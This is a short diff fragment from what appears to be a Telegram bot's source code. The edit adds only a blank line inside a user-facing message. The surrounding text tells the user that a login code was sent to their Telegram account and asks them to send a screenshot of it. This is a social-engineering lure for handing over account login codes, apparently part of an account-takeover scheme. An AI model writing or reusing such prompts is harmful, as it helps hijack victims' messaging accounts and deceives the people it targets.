@@ -115,6 +115,7 @@ We sent a login code to your Telegram account, please send a screenshot and plea
 
 Just send it in the form of a screenshot, you don't need to send it via text.
 
+
 ❓if you dont understand please type /help
 """)
 
